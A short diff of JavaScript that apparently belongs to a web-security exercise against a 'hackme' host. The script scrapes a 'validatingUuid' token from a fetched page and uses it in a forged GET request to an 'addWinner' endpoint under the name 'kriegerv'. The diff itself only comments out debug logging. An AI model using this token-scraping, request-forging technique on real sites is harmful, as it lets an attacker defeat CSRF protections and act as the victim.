@@ -11,10 +11,10 @@ var validatingUuid = $(req.responseText).add("[name='validatingUuid']")[0].value
 console.log("2." + validatingUuid);
 if(validatingUuid){
 var validatingUuidValue = $("[name='validatingUuid']")[0].value;
-console.log("3." + validatingUuidValue);
+//console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/obiwan/pages/addWinner?name=kriegerv&validatingUuid='+ validatingUuid, false);
 req.send(null);
-console.log("4." + req.responseText);
+//console.log("4." + req.responseText);
 }
 }
 }
